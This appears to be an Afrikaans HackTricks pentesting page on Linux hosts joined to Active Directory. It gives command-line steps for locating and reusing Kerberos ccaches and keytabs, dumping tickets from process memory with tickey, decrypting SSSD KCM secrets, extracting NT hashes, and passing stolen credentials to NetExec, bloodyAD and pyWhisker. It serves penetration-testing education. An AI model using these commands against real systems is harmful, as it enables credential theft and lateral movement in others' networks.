# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

’n Linux-masjien kan ook binne ’n Active Directory-omgewing voorkom.

’n Linux-masjien binne ’n AD kan **Kerberos-materiaal plaaslik stoor**: gebruiker-ccaches, masjien-/diens-keytabs en geheime wat deur SSSD bestuur word. Hierdie artefakte kan gewoonlik hergebruik word soos enige ander Kerberos-eiebewys. Om die meeste daarvan te lees, moet jy die gebruiker-eienaar van die ticket of **root** op die masjien wees.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

## Enumerasie

### AD-enumerasie vanaf Linux

As jy toegang tot ’n AD vanaf Linux (of bash in Windows) het, kan jy [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) probeer om die AD te enumereer.

Jy kan ook die volgende bladsy raadpleeg om **ander maniere te leer om AD vanaf Linux te enumereer**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA is ’n oopbron-**alternatief** vir Microsoft Windows **Active Directory**, hoofsaaklik vir **Unix**-omgewings. Dit kombineer ’n volledige **LDAP-gids** met ’n MIT **Kerberos**-sleutelverspreidingsentrum vir bestuur soortgelyk aan Active Directory. Deur die Dogtag **Certificate System** vir CA- en RA-sertifikaatbestuur te gebruik, ondersteun dit **multifaktor**-verifikasie, insluitend slimkaarte. SSSD is geïntegreer vir Unix-verifikasieprosesse.<sup>[[14]](#references)[[15]](#references)</sup> Lees meer daaroor by:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Artefakte van domeingekoppelde gashere

Voordat jy aan tickets raak, bepaal **hoe die gasheer by AD aangesluit is** en **waar Kerberos-materiaal werklik gestoor word**. Op moderne Linux-gashere word dit gewoonlik deur `realmd` + `adcli` + `sssd` hanteer, nie net deur plat lêers in `/tmp` nie.<sup>[[10]](#references)</sup>

```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```

Dit vertel jou vinnig of die gasheer AD vertrou, of SSSD identiteite of tickets kas, en of **masjien-/diens-keytabs** of **KCM-geheime** beskikbaar is vir misbruik.<sup>[[4]](#references)[[10]](#references)</sup>

Behandel `/var/lib/sss/db/cache_*.ldb` apart van Kerberos-ccaches en `/var/lib/sss/secrets/secrets.ldb`. Die `cache_*.ldb`-lêers kan vanlyn wagwoordverifikators bevat wanneer `cache_credentials = true` vir ’n domein ingestel is **en** die gebruiker voorheen op daardie gasheer geverifieer is. Gewoonlik is slegs gebruikers met verhoogde toegang in staat om dit te lees. ’n Cache-lêer of geaktiveerde instelling alleen bewys nie dat ’n bruikbare, huidige wagwoord beskikbaar is nie; gaan die effektiewe instelling per domein en die werklike identiteite in die kas na voordat jy dié gevolgtrekking maak. Sien [Red Hat se dokumentasie oor SSSD se geloofsbriewekas](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/epub/configuring_authentication_and_authorization_in_rhel/overview-single-sign-on_introduction-to-system-authentication). Vir ’n afsonderlike Linux-na-AD-identiteitsgrens is [Kerberos-naamkartering oor verskillende verskaffers](https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/) slegs ter sake wanneer ’n diens die ticket aanvaar en die principal aan die toepaslike Unix-rekening koppel.

Op ’n gasheer met `ksu` kan ’n geldige Kerberos-principal toegang kry tot ’n **plaaslike teikenrekening**, insluitend root, maar slegs wanneer daardie rekening die principal magtig. [MIT Kerberos dokumenteer](https://web.mit.edu/Kerberos/www/krb5-latest/doc/user/user_commands/ksu.html) die teiken se `.k5login`- en `.k5users`-lêers in die tuisgids, asook die terugvalnaamkartering wanneer nie een van die lêers bestaan nie. `.k5users` kan ook opdragte vir `ksu -e` beperk; die blote bestaan van ’n lêer bewys nie dat shelltoegang moontlik is nie. Gaan die presiese teikenrekening, lêereienaarskap/-toestemmings en leesbare magtigingsinskrywings, beskikbare Kerberos-geloofsbriewe en effektiewe karteringsreëls na. As die root-tuisgids ontoeganklik is, bly die magtigingstatus onbekend. Passiewe enumerasie behoort hierdie paaie en toestemmings te lys sonder om tickets aan te vra of `ksu` uit te voer.

’n Geskeduleerde rugsteun kan indirek ’n `.k5login`-magtigingsgrens skep. As ’n rekening met hoër voorregte ’n gids wat deur ’n gebruiker met laer voorregte geskryf kan word, rekursief na sy eie tuisgids kopieer, moet jy bevestig dat die kopie versteekte lêers insluit, dat die bestemmingspad die rekening se effektiewe tuisgids is, en dat die resulterende lêer eienaarskap het wat deur die Kerberos-aanmeldingsdiens aanvaar word. Byvoorbeeld, [rsync dokumenteer](https://download.samba.org/pub/rsync/rsync.1.html) dat `-a --no-owner` nuwe bestemmingslêers deur die ontvangende gebruiker laat besit. [MIT Kerberos dokumenteer](https://web.mit.edu/kerberos/www/krb5-latest/doc/user/user_config/k5login.html) hoe ’n principal in daardie gebruiker se `.k5login` toegang kan magtig. Bevestig die geskeduleerde taak se RunAs-identiteit, skryftoegang tot die bron, effektiewe rsync-opsies, GSSAPI-geaktiveerde aanmelding en ’n geldige ticket vir die gelyste principal; ’n skryfbare brongids of ’n geskeduleerde rsync-opdrag alleen bewys nie dat dié pad werk nie.

’n Leesbare keytab vereis ook ’n principal-spesifieke ondersoek. ’n Keytab wat ’n principal met ’n administrasienaam bevat, is op sigself nie bewys van administratiewe regte nie: die [KDC se `kadm5.acl`-beleid](https://web.mit.edu/Kerberos/www/krb5-1.22/doc/admin/conf_files/kadm5_acl.html) bepaal watter principal-bewerkings toegelaat word. Bevestig die principal, effektiewe ACL en plaaslike `ksu`- of aanmeldingsmagtiging afsonderlik voordat jy keytab-toegang as ’n roete na root beskou. Passiewe triage kan die keytab-pad en -toestemmings lys sonder om die sleutels te gebruik of die KDC te kontak.

## Speel met tickets

### Pass The Ticket

Op hierdie bladsy vind jy verskillende plekke waar jy **Kerberos-tickets binne ’n Linux-gasheer kan vind**. Op die volgende bladsy kan jy leer hoe om hierdie CCache-ticketformate na Kirbi om te skakel (die formaat wat jy in Windows moet gebruik) en hoe om ’n PTT-aanval uit te voer:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

As jy die **Linux-spesifieke werkvloeie vir ticket-insameling** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, ens.) wil hê, raadpleeg die toegewyde bladsy:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Hergebruik van CCACHE-tickets vanaf /tmp

CCACHE-lêers is binêre formate vir **die berging van Kerberos-geloofsbriewe**. `FILE:/tmp/krb5cc_%{uid}` is steeds algemeen, maar moderne Linux-ontplooiings gebruik ook `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` of `KCM:%{uid}`. Gaan die omgewingsveranderlike **`KRB5CCNAME`** en die instelling `default_ccache_name` na voordat jy aanvaar dat tickets in `/tmp` is.<sup>[[1]](#references)[[3]](#references)</sup>

```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```

### CCACHE ticket-hergebruik vanaf keyring

**Kerberos tickets wat in ’n proses se geheue gestoor word, kan onttrek word**, veral wanneer die masjien se ptrace-beskerming gedeaktiveer is (`/proc/sys/kernel/yama/ptrace_scope`). ’n Nuttige hulpmiddel hiervoor is beskikbaar by [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey). Dit vergemaklik die onttrekking deur in sessies te inject en tickets na `/tmp` te dump.<sup>[[1]](#references)[[16]](#references)</sup>

Volg die stappe hieronder om hierdie hulpmiddel op te stel en te gebruik:

```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```

Hierdie prosedure sal probeer om in verskeie sessies te inject, en dui sukses aan deur onttrekte tickets in `/tmp` te stoor volgens die naamkonvensie `__krb_UID.ccache`.<sup>[[1]](#references)</sup>

### Hergebruik van CCACHE-ticket vanaf SSSD KCM

SSSD hou ’n kopie van die databasis by die pad `/var/lib/sss/secrets/secrets.ldb`. Die ooreenstemmende sleutel word as ’n versteekte lêer by die pad `/var/lib/sss/secrets/.secrets.mkey` gestoor. By verstek is die sleutel slegs leesbaar as jy **root**-toestemmings het.<sup>[[4]](#references)</sup>

Deur **`SSSDKCMExtractor`** met die parameters --database en --key aan te roep, sal die databasis ontleed en die geheime **dekripteer** word.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```

Die extractor druk rou Kerberos JSON-payloads uit; skakel dit om na ’n bruikbare ticket cache of ’n ander ticket-formaat voordat jy pass-the-cache/pass-the-ticket-bewerkings uitvoer.<sup>[[4]](#references)</sup>

### Vinnige keytab-ondersoek

```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```

### Onttrek rekeninge uit /etc/krb5.keytab

Diensrekening-sleutels, wat noodsaaklik is vir dienste wat met root-regte werk, word veilig in **`/etc/krb5.keytab`**-lêers gestoor. Hierdie sleutels, wat soos wagwoorde vir dienste is, vereis streng vertroulikheid.<sup>[[5]](#references)</sup>

Om die inhoud van die keytab-lêer te ondersoek, kan **`klist`** gebruik word. Op Linux druk `klist -k -K -e` die principals, sleutelweergawe-nommers, enkripsietipes en rou sleuteldata uit. As die sleuteltipe **23 / RC4-HMAC** is, is die sleutelwaarde ook die **NT-hash** van daardie principal.<sup>[[6]](#references)[[17]](#references)</sup>

```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```

Vir Linux-gebruikers bied **`KeyTabExtract`** funksionaliteit om die RC4 HMAC hash te onttrek, wat vir NTLM hash-hergebruik aangewend kan word. Let daarop dat dit net help wanneer die keytab steeds **etype 23 / RC4-HMAC**-materiaal bevat. In **AES-only**-omgewings kry jy dalk nie ’n herbruikbare NT hash nie, maar jy kan steeds direk met die keytab via Kerberos verifieer.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```

Op macOS dien **`bifrost`** as ’n hulpmiddel vir keytab-lêeranalise.<sup>[[8]](#references)</sup>

```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```

Deur die onttrekte rekening- en hash-inligting te gebruik, kan verbindings met bedieners gevestig word met nutsmiddels soos **`NetExec`**.<sup>[[9]](#references)</sup>

```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
```

### Hergebruik die masjienrekening uit `/etc/krb5.keytab`

Op stelsels wat by `realmd`/`adcli`/`sssd` aangesluit is, bevat `/etc/krb5.keytab` gewoonlik die **rekenaarrekening** en een of meer **host/service-principals**. As jy **root** het, moet jy dit nie bloot dump nie: gebruik een van die principals wat deur `klist -k` gelys word om ’n TGT aan te vra en as die Linux-gasheer self op te tree.<sup>[[10]](#references)</sup>

```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```

Dit is veral nuttig wanneer die **computer object** self gedelegeerde regte in AD het, of wanneer die gasheer toegelaat word om ander geheime soos ’n **gMSA** te herwin.<sup>[[13]](#references)</sup>

### Hergebruik gesteelde Kerberos-materiaal met Linux-first AD-tooling

Sodra jy ’n geldige `ccache` of ’n bruikbare keytab het, kan jy **direk vanaf Linux** teen AD optree sonder om eers alles na Windows-formate om te skakel. Baie moderne nutsmiddels aanvaar `KRB5CCNAME` / Kerberos-auth inheems.<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>

```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
  --target 'WEB01$' --action list
```

This is ’n goeie brug tussen **Linux post-exploitation** en **AD object abuse**. Vir die object-level abuse-paaie self, kyk na:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account-artefakte

Onlangse Linux-ontplooiings kan **Managed Service Accounts** direk vanaf AD gebruik. In die praktyk beteken dit dat jy, nadat jy ’n Linux-bediener gekompromitteer het, nie net die gasheer se keytab kan vind nie, maar ook **diensspesifieke keytabs** wat vanaf ’n gMSA gegenereer is. Algemene plekke om te inspekteer, is `/etc/gmsad.conf`, ontplooiingspesifieke konfigurasielêers en bykomende `*.keytab`-lêers onder `/etc`.<sup>[[2]](#references)[[13]](#references)</sup>

```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```

Dit gee jou ’n herbruikbare Kerberos-identiteit vir die SPNs wat aan daardie gMSA gekoppel is **sonder om enige Windows-eindpunt aan te raak**.<sup>[[13]](#references)</sup> Vir misbruik van gMSA/dMSA aan die **domeinkant** nadat jy hoër voorregte in AD verkry het, kyk na:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos (II): Hoe om Kerberos aan te val?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Toegang tot AD met ’n bestuurde diensrekening – Integrasie van RHEL-stelsels direk met Active Directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
- [3] [Kerberos-omgewingsveranderlikes – MIT Kerberos-dokumentasie](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
- [5] [keytab – MIT Kerberos-dokumentasie](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
- [6] [RFC 4757: Die RC4-HMAC-Kerberos-enkripsietipes wat deur Microsoft Windows gebruik word](https://www.rfc-editor.org/rfc/rfc4757)
- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [8] [bifrost](https://github.com/its-a-feature/bifrost)
- [9] [Gebruik van Kerberos | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
- [10] [Ontdekking van identiteitsdomeine en aansluiting daarby | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
- [11] [bloodyAD-gebruikersgids](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [13] [gmsad](https://github.com/cea-sec/gmsad)
- [14] [Oor | FreeIPA-dokumentasie](https://www.freeipa.org/About.html)
- [15] [FreeIPA 4.11.0-vrystellingsnotas](https://www.freeipa.org/release-notes/4-11-0.html)
- [16] [Yama – Linux-kerneldokumentasie](https://docs.kernel.org/admin-guide/LSM/Yama.html)
- [17] [klist – MIT Kerberos-dokumentasie](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
{{#include ../../banners/hacktricks-training.md}}
